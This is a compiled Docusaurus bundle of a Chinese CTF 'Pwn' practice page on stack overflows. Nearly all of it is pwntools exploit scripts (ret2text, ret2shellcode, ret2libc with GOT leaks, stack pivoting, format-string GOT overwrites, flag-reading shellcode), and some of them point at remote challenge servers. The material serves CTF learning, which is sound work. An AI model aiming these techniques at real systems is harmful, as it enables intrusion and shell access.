"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2869],{4719:(e,n,l)=>{l.r(n),l.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>c,frontMatter:()=>a,metadata:()=>t,toc:()=>p});var s=l(4848),r=l(8453);const a={sidebar_label:"\u7ec3\u4e60\u9898",sidebar_position:5},i="\u6808\u6ea2\u51fa",t={id:"Pwn/task",title:"\u6808\u6ea2\u51fa",description:"ret2text",source:"@site/docs/Pwn/task.md",sourceDirName:"Pwn",slug:"/Pwn/task",permalink:"/docs/Pwn/task",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Pwn/task.md",tags:[],version:"current",sidebarPosition:5,frontMatter:{sidebar_label:"\u7ec3\u4e60\u9898",sidebar_position:5},sidebar:"pwnSidebar",previous:{title:"\u8c03\u8bd5\u5b66\u4e60",permalink:"/docs/Pwn/gdb"},next:{title:"\u57fa\u7840\u77e5\u8bc6",permalink:"/docs/Pwn/note"}},d={},p=[{value:"ret2text",id:"ret2text",level:2},{value:"ret2text0_x32",id:"ret2text0_x32",level:3},{value:"ret2text1",id:"ret2text1",level:3},{value:"pwninit",id:"pwninit",level:4},{value:"clibc",id:"clibc",level:4},{value:"ret2text2",id:"ret2text2",level:3},{value:"ret2text3",id:"ret2text3",level:3},{value:"ret2shellcode",id:"ret2shellcode",level:2},{value:"ezshellcode",id:"ezshellcode",level:3},{value:"ret2syscall",id:"ret2syscall",level:2},{value:"ret2libc",id:"ret2libc",level:2},{value:"\u52a8\u8c03\u8ba1\u7b97\u504f\u79fb",id:"\u52a8\u8c03\u8ba1\u7b97\u504f\u79fb",level:4},{value:"\u6784\u9020\u6cc4\u9732gotpayload",id:"\u6784\u9020\u6cc4\u9732gotpayload",level:4},{value:"ORW",id:"orw",level:2},{value:"stack_pivot",id:"stack_pivot",level:2},{value:"fmt2_x64",id:"fmt2_x64",level:2},{value:"fmt3_x64",id:"fmt3_x64",level:2},{value:"canary",id:"canary",level:2},{value:"PIE",id:"pie",level:2},{value:"sandbox",id:"sandbox",level:2},{value:"shellcode",id:"shellcode",level:3}];function o(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"\u6808\u6ea2\u51fa",children:"\u6808\u6ea2\u51fa"}),"\n",(0,s.jsx)(n.h2,{id:"ret2text",children:"ret2text"}),"\n",(0,s.jsx)(n.h3,{id:"ret2text0_x32",children:"ret2text0_x32"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'from pwn import *\ncontext(os="linux",arch="i386",log_level="debug")\nelf = ELF("ezr0p")\nio = process("ezr0p")\nsys_adr = elf.symbols["system"]\nshell_adr = 0x804A080\ncallsys = 0x8048562\nprint("sys_adr -------\x3e "+ hex(sys_adr))\n# payload = b\'s\' * (28+4) + p32(sys_adr) + p32(0)+ p32(shell_adr)\npayload = b\'s\' * (28+4) + p32(callsys)+ p32(shell_adr)\nio.recvuntil(b"please tell me your name")\nio.send(b"/bin/sh")\nio.recvuntil(b"now it\'s your play time~")\nio.send(payload)\nio.interactive()\n'})}),"\n",(0,s.jsx)(n.h3,{id:"ret2text1",children:"ret2text1"}),"\n",(0,s.jsx)(n.p,{children:"\u82e5\u672c\u5730\u73af\u5883\u5927\u4e8eUbuntu18\uff0c\u5219\u9700\u8981\u4f7f\u7528clibc\u53bb\u5c06\u7a0b\u5e8f\u7684glibc\u7248\u672c\u4fee\u6539\u5230\u65e7\u7248\u672c\uff0c\u5426\u5219\u65e0\u6cd5\u6210\u529f\u5229\u7528\u6f0f\u6d1e\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"pwninit",children:"pwninit"}),"\n",(0,s.jsx)(n.p,{children:"\u786e\u4fddpwninit\u3001\u9898\u76ee\u6587\u4ef6\u548clibc\u6587\u4ef6\u5728\u540c\u4e00\u76ee\u5f55\u4e0b\uff08\u4e5f\u53ef\u4ee5\u5c06pwninit\u914d\u7f6e\u4e3a\u73af\u5883\u53d8\u91cf\uff09\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"pwninit\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e4b\u540e\u4f1a\u5728\u672c\u5730\u751f\u4ea7\u4fee\u6539libc\u7684\u7248\u672c\u4ee5\u53ca\u4e00\u4e2aexp\u6a21\u677f\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"clibc",children:"clibc"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://github.com/tower111/pwn-change-libc",children:"\u4e0b\u8f7d\u94fe\u63a5"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"git clone https://github.com/tower111/pwn-change-libc\ncd pwn-change-libc\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c06\u6b64\u9879\u76ee\u4e0bupdate_list\u6587\u4ef6\u7b2c\u4e00\u884c\u7684python\u6539\u4e3apython3"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"python3 get_env.py\nsudo ln -s <clibc\u7684\u7edd\u5bf9\u8def\u5f84> /usr/bin/clibc\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528\u65b9\u6cd5\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"#clibc \u76ee\u6807\u6587\u4ef6 \u76ee\u6807\u7248\u672c\nclibc pwn 2.21\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"#\u5c06glibc\u7248\u672c\u6539\u4e3a\u65e7\u7248\u672c\nclibc pwn 2.23\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7b80\u5355\u7248\u672cexp\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nelf = ELF(\"./pwn\") #\u4f7f\u7528ELF\u51fd\u6570\u53bb\u89e3\u6790\u76ee\u6807\u6587\u4ef6\uff0c\u5b58\u50a8\u4e3aelf\u5bf9\u8c61\nio = process(\"./pwn_new\") #\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u547d\u540d\u4e3aio\nio.recvuntil(b\"do you know ret2text?\\n\") #\u4e00\u76f4\u63a5\u6536\u6570\u636e\uff0c\u76f4\u5230\u63a5\u6536\u5230\u6307\u5b9a\u6570\u636e\nback_door = 0x401235 #ida\u67e5\u627e\u540e\u95e8\u5730\u5740\npayload = b's'*0x58 + p64(back_door) #\u586b\u5145\u6b63\u5e38\u7a7a\u95f4+rbp + \u6076\u610f\u5730\u5740\nio.sendline(payload) #\u53d1\u9001payloa\nio.interactive() #\u8fdb\u884c\u4ea4\u4e92\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","\u9ad8\u7ea7\u624b\u52a8\u6784\u9020rop\u7684exp:"]}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u8be2poprdi\u5730\u5740\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'ROPgadget --binary ./pwn --only "pop|ret"\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nelf = ELF(\"./pwn\") #\u4f7f\u7528ELF\u51fd\u6570\u53bb\u89e3\u6790\u76ee\u6807\u6587\u4ef6\uff0c\u5b58\u50a8\u4e3aelf\u5bf9\u8c61\nio = process(\"./pwn\") #\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u547d\u540d\u4e3aio\n\nio.recvuntil(b\"do you know ret2text?\\n\") #\u4e00\u76f4\u63a5\u6536\u6570\u636e\uff0c\u76f4\u5230\u63a5\u6536\u5230\u6307\u5b9a\u6570\u636e\ngdb.attach(io)\nback_door = 0x401235 #ida\u67e5\u627e\u540e\u95e8\u5730\u5740\nret = 0x40101a #ROPgadget --binary ./pwn --only\"pop|ret\"\n# payload = b's'*0x58 + p64(ret) + p64(back_door) #\u586b\u5145\u6b63\u5e38\u7a7a\u95f4+rbp + \u6076\u610f\u5730\u57404\n#ROPgadget --binary ./pwn --only \"pop|ret\"\npop_rdi_ret =0x4012c3\nshell_adr = 0x40201A #ida\u67e5\u8be2\nsys_adr = elf.symbols['system']\n\npause()\npayload = b's'*0x58 + p64(pop_rdi_ret) + p64(shell_adr) + p64(sys_adr)\nio.sendline(payload) #\u53d1\u751fpayloa\nio.interactive() #\u8fdb\u884c\u4ea4\u4e92\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u65b0\u7248\u6dfb\u52a0\u4e86\u6808\u5bf9\u9f50\u6821\u9a8c\u4e5f\u6709\u529e\u6cd5\u7ed5\u8fc7\uff0c\u6dfb\u52a0\u4e00\u4e2aret\u6307\u4ee4\u5373\u53ef\uff1a"}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528ROPgadget\u67e5\u8be2ret\u6307\u4ee4\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'ROPgadget --binary ./pwn --only "pop|ret"\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"http://image.shangu127.top/img/2024/03/image-20240522173002990.png",alt:"image-20240522173002990"})}),"\n",(0,s.jsx)(n.p,{children:"\u6b64\u811a\u672c\u53ef\u4ee5\u5728\u9ad8\u7248\u672clinux\u4e2d\u6210\u529f\u5229\u7528\u6f0f\u6d1e\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nelf = ELF(\"./pwn\") #\u4f7f\u7528ELF\u51fd\u6570\u53bb\u89e3\u6790\u76ee\u6807\u6587\u4ef6\uff0c\u5b58\u50a8\u4e3aelf\u5bf9\u8c61\nio = process(\"./pwn\") #\u542f\u52a8\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u547d\u540d\u4e3aio\nio.recvuntil(b\"do you know ret2text?\\n\") #\u4e00\u76f4\u63a5\u6536\u6570\u636e\uff0c\u76f4\u5230\u63a5\u6536\u5230\u6307\u5b9a\u6570\u636e\nback_door = 0x401235 #ida\u67e5\u627e\u540e\u95e8\u5730\u5740\nret = 0x40101a #ROPgadget --binary ./pwn --only \"pop|ret\"\npayload = b's'*0x58 + p64(ret) + p64(back_door) #\u586b\u5145\u6b63\u5e38\u7a7a\u95f4+rbp + \u6076\u610f\u5730\u5740\nio.sendline(payload) #\u53d1\u751fpayloa\nio.interactive() #\u8fdb\u884c\u4ea4\u4e92\n"})}),"\n",(0,s.jsx)(n.h3,{id:"ret2text2",children:"ret2text2"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\nfrom LibcSearcher import*\nimport sys\nremote_addr = ["49.233.15.226",8003]\n#libc=ELF(\'\')\nif len(sys.argv) == 1:\n    context.log_level="debug" \n    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) \n    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) \n    p = process("")\n    context(arch=\'\', os=\'linux\')\nif len(sys.argv) == 2 :\n    if \'r\' in sys.argv[1]:\n        p = remote(remote_addr[0],remote_addr[1])\n    if \'n\' not in sys.argv[1]:\n        context.log_level="debug" \n        #context(arch = \'amd64\', os = \'linux\')\nr = lambda : p.recv()\nrc = lambda x: p.recv(x)\nru = lambda x: p.recvuntil(x)\nrud = lambda x: p.recvuntil(x, drop=True)\ns = lambda x: p.send(x)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nshell = lambda : p.interactive()\npr = lambda name,x : log.info(name+\':\'+hex(x))\n\npop_rdi = 0x4012c3\nbin_sh = 0x404048\nsystem_addr = 0x401254\n\npayload = b\'a\' (0xa0 + 0x8) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\nsl(payload)\n\nshell()\n'})}),"\n",(0,s.jsx)(n.h3,{id:"ret2text3",children:"ret2text3"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\nfrom LibcSearcher import *\nimport sys\nremote_addr = [\"gxh191.top\",25534]\n#libc=ELF('')\nelf = ELF('./pwn3_2')\nif len(sys.argv) == 1:\n    context.log_level=\"debug\" \n    #p = process([\"qemu-aarch64\", \"-L\", \"/usr/aarch64-linux-gnu/\", \"-g\",\"1234\",\"./stack\"]) \n    #p = process([\"qemu-aarch64\", \"-L\", \".\", \"./stack\"]) \n    p = process(\"./pwn3_2\")\n    context(arch='amd64', os='linux')\nif len(sys.argv) == 2 :\n    if 'r' in sys.argv[1]:\n        p = remote(remote_addr[0],remote_addr[1])\n    if 'n' not in sys.argv[1]:\n        context.log_level=\"debug\" \n        #context(arch = 'amd64', os = 'linux')\nr = lambda : p.recv()\nrl = lambda : p.recvline()\nrc = lambda x: p.recv(x)\nru = lambda x: p.recvuntil(x)\nrud = lambda x: p.recvuntil(x, drop=True)\ns = lambda x: p.send(x)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nshell = lambda : p.interactive()\npr = lambda name,x : log.info(name+':'+hex(x))\n\n#gdb.attach(p)\nsystem_plt = p64(elf.plt['system'])\npop_rdi = p64(0x4012c3)\nbinsh = p64(0x404090)\nret = p64(0x40101a)\n\nru(b':\\n')\npayload = b'/bin/sh\\x00'\ns(payload)\nru(b'something: ')\npayload = b'a' * (0x10 + 8) + ret + pop_rdi + binsh + system_plt\ns(payload)\n\nshell()\n"})}),"\n",(0,s.jsx)(n.h2,{id:"ret2shellcode",children:"ret2shellcode"}),"\n",(0,s.jsx)(n.h3,{id:"ezshellcode",children:"ezshellcode"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"from pwn import *\ncontext(os='linux',arch='i386',log_level='debug')\nelf = ELF(\"./pwn\")\n# io = remote(\"node4.buuoj.cn\",26890)\nio= process(\"./pwn\")\nio.recvuntil(b\"What's this:\")\nshell_adr = int(io.recv(10)[2:],16)\nprint(hex(shell_adr))\nshellcode = asm(shellcraft.sh())\npayload = shellcode\npayload = payload.ljust(140,b's')\npayload += p32(shell_adr)\nio.sendline(payload)\nio.interactive()\n"})}),"\n",(0,s.jsxs)(n.p,{children:[":star",":ret2libc","\u6253\u6cd5\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"from pwn import *\nimport sgtlibc\ncontext(os='linux',arch='i386',log_level='debug')\nelf = ELF(\"./pwn\")\nio = remote(\"node4.buuoj.cn\",26890)\n\nwrite_plt = elf.plt['write']\nwrite_got = elf.got['write']\nmain_adr = 0x804847B\npayload = b's'*140 + p32(write_plt) + p32(main_adr) + p32(1) + p32(write_got) + p32(4)\nio.sendline(payload)\nwrite_adr = u32(io.recv(4))\nlibc = sgtlibc.Searcher(\"write\",write_adr)\nsystem_adr = libc.get_address(sgtlibc.s_system)\nshell_adr = libc.get_address(sgtlibc.s_binsh)\npayload2 = b's'*140 + p32(system_adr) + p32(0) + p32(shell_adr)\nio.sendline(payload2)\nio.interactive()\n"})}),"\n",(0,s.jsx)(n.h2,{id:"ret2syscall",children:"ret2syscall"}),"\n",(0,s.jsx)(n.h2,{id:"ret2libc",children:"ret2libc"}),"\n",(0,s.jsx)(n.p,{children:"\u7a0b\u5e8fsystem\uff0c\u9759\u6001\u7684system\u4e0e\u9759\u6001\u7684puts\u7684\u504f\u79fb\u91cf\u3002"}),"\n",(0,s.jsx)(n.p,{children:"puts\u52a0\u8f7d\u540e\u518dgot\u8868\u7684\u5730\u5740\uff08libc\u4e2d\u7684puts\u8bb0\u8f7d\u5230\u5185\u5b58\u7684\u4f4d\u7f6e\uff09\uff0c"}),"\n",(0,s.jsx)(n.p,{children:"\u52a0\u8f7d\u5230\u5185\u5b58\u4ea7\u751f\u7684\u504f\u79fb\u91cf = \u52a0\u8f7d\u540egot\u5730\u5740 - \u52a0\u8f7d\u524dlibc\u5185\u9759\u6001\u5730\u5740"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"system\u52a8\u6001\u53ef\u8c03\u7528\u5730\u5740 = \u52a0\u8f7d\u5185\u5b58\u7684\u504f\u79fb\u91cf + \u9759\u6001\u7684system\u5730\u5740"})}),"\n",(0,s.jsx)(n.p,{children:"puts_adr"}),"\n",(0,s.jsx)(n.p,{children:"system_adr"}),"\n",(0,s.jsx)(n.p,{children:"puts_got"}),"\n",(0,s.jsx)(n.p,{children:"iv = puts_got - puts_adr"}),"\n",(0,s.jsx)(n.p,{children:"system = iv + system_adr"}),"\n",(0,s.jsx)(n.p,{children:"write(write_got)"}),"\n",(0,s.jsx)(n.h4,{id:"\u52a8\u8c03\u8ba1\u7b97\u504f\u79fb",children:"\u52a8\u8c03\u8ba1\u7b97\u504f\u79fb"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"cyclic 200\ncyclic -l esp\u5bc4\u5b58\u5668\u5185\u7684\u64cd\u4f5c\u6570\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"http://image.shangu127.top/img/2024/03/image-20240523142332619.png",alt:"image-20240523142332619"})}),"\n",(0,s.jsx)(n.h4,{id:"\u6784\u9020\u6cc4\u9732gotpayload",children:"\u6784\u9020\u6cc4\u9732gotpayload"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"http://image.shangu127.top/img/2024/03/image-20240523142600746.png",alt:"image-20240523142600746"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'ROPgadget --binary ./pwn --only "pop|ret"\n0x00000000004006b3 : pop rdi ; ret\n0x00000000004006b1 : pop rsi ; pop r15 ; ret\n'})}),"\n",(0,s.jsx)(n.p,{children:"exp:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\nimport pdb\ncontext(os=\'linux\',arch=\'amd64\',log_level=\'debug\')\nelf = ELF("./pwn")\nlibc = ELF("./libc.so.6")\nio = process("./pwn")\nwrite_adr = libc.symbols[\'write\'] #\u83b7\u53d6\u9759\u6001write\u5730\u5740\nsystem_adr = libc.symbols[\'system\'] #\u83b7\u53d6\u9759\u6001system\u5730\u5740\nmain_adr = elf.symbols["main"]\nshell_adr = libc.search(b"/bin/sh").__next__()\n# pdb.set_trace()\nwrite_got = elf.got["write"]\nwrite_plt = elf.plt["write"]\n#write_plt(1,write_got,100)\n# ROPgadget --binary ./pwn --only "pop|ret"\n# 0x00000000004006b3 : pop rdi ; ret\n# 0x00000000004006b1 : pop rsi ; pop r15 ; ret\npop_rdi = 0x4006b3\npop_rsi_r15 = 0x4006b1\npayload1 = b\'s\'*136 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_adr)\n\nio.recvuntil(b":")\n# gdb.attach(io)\n\n# pause()\nio.sendline(payload1)\nio.recvline()\nwrite_call = u64(io.recv(6).ljust(8,b"\\x00")) #\u63a5\u53d76\u4e2a\u6570\u636e\uff0c\u5e76\u6309\u71678\u4e2a\u4e00\u7ec4\u8fdb\u884c\u586b\u5145\uff0c\u6700\u540e\u89e3\u5305\n\nprint(hex(write_call))\n#\u8ba1\u7b97\u504f\u79fb\u548c\u52a0\u8f7d\u5730\u5740\niv = write_call - write_adr\nsys_call = iv + system_adr\nshell_call = shell_adr + iv\npayload2 = b\'s\'*136 + p64(pop_rdi) + p64(shell_call) + p64(sys_call)\n\nio.recvuntil(b":")\nio.sendline(payload2)\nio.interactive()\n'})}),"\n",(0,s.jsx)(n.h2,{id:"orw",children:"ORW"}),"\n",(0,s.jsx)(n.h2,{id:"stack_pivot",children:"stack_pivot"}),"\n",(0,s.jsxs)(n.p,{children:["\ud83c\udf1f","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'from pwn import *\nimport sgtlibc\ncontext(os="linux",arch=\'amd64\',log_level=\'debug\')\nelf=ELF("pwn")\nio=process("./pwn")\n\nread_adr = 0x4011FD\naddr1 = 0x404858\npayload1 = b\'s\'*80 + p64(addr1) + p64(read_adr)\nio.sendlineafter(b"do you know stack pivoting?",payload1)\nputs_got = elf.got["puts"]\nputs_plt = elf.plt["puts"]\npop_rdi = 0x401283\nleave_ret = 0x40121d\npayload2 = p64(0x404808)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_adr)\npayload2 = payload2.ljust(80,b\'\\x00\') + p64(0x404808) + p64(leave_ret)\nio.send(payload2)\nputs_adr = u64(io.recvuntil(b"\\x7f")[-6:].ljust(8,b"\\x00"))\nprint("puts_adr -----\x3e "+hex(puts_adr))\nlibc = sgtlibc.Searcher()\nlibc.add_condition("puts",puts_adr)\nlibc.dump(db_index=2)\nsystem_adr = libc.get_address(sgtlibc.s_system)\nshell_adr = libc.get_address(sgtlibc.s_binsh)\n# gdb.attach(io)\n# pause()\npayload3 = p64(0) + p64(pop_rdi) + p64(shell_adr) + p64(system_adr)\npayload3 = payload3.ljust(80,b"\\x00") + p64(0x4047b8) + p64(leave_ret)\nio.send(payload3)\n\nio.interactive()\n'})}),"\n",(0,s.jsx)(n.h1,{id:"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32",children:"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32"}),"\n",(0,s.jsx)(n.h2,{id:"fmt2_x64",children:"fmt2_x64"}),"\n",(0,s.jsxs)(n.p,{children:["\u2b50","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\nimport sgtlibc\np = process("./fmt2_x64")\n\np.sendafter(b">>>\\n", "%39$p")\nlibc = int(p.recv(14).decode("utf-8"), 16) - 0x21c87\nprint(hex(libc))\none = libc + 0x4f420\ncontext.arch = \'amd64\'\nsuccess(hex(one))\npayload = fmtstr_payload(6, {0x601028:p64(one)})\np.sendline(payload)\n\np.interactive()\n'})}),"\n",(0,s.jsx)(n.h2,{id:"fmt3_x64",children:"fmt3_x64"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch='amd64',log_level='debug')\nio = process(\"./fmt3_x64\")\npayload = fmtstr_payload(6,{0x6009b8:0x4006f8})\nprint(payload)\nio.recvuntil(b\">>>\")\ngdb.attach(io)\npause()\nio.sendline(payload)\nio.interactive()\n"})}),"\n",(0,s.jsx)(n.h1,{id:"\u4fdd\u62a4\u7ed5\u8fc7",children:"\u4fdd\u62a4\u7ed5\u8fc7"}),"\n",(0,s.jsx)(n.h2,{id:"canary",children:"canary"}),"\n",(0,s.jsx)(n.h2,{id:"pie",children:"PIE"}),"\n",(0,s.jsx)(n.h2,{id:"sandbox",children:"sandbox"}),"\n",(0,s.jsx)(n.h3,{id:"shellcode",children:"shellcode"}),"\n",(0,s.jsxs)(n.p,{children:["\u2b50","exp:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from pwn import *\ncontext(os='linux',arch=\"amd64\",log_level='debug')\nelf = ELF(\"./shellcode\")\nshangu = 0\nio = process(\"./shellcode\")\n\nshellcode = asm(shellcraft.cat('flag'))\nshellcode2 = asm('''\nsub rsp,0x30\ncall rsp\n''')\nprint(shellcode)\nshellcode=shellcode.ljust(0x28,b\"\\x00\")\n\njmp_jsp = 0x400785\npayload = shellcode + p64(jmp_jsp) + shellcode2\ngdb.attach(io)\npause()\nio.sendafter(b\"Can u pwn me?\",payload)\nio.interactive()\n"})})]})}function c(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(o,{...e})}):o(e)}},8453:(e,n,l)=>{l.d(n,{R:()=>i,x:()=>t});var s=l(6540);const r={},a=s.createContext(r);function i(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);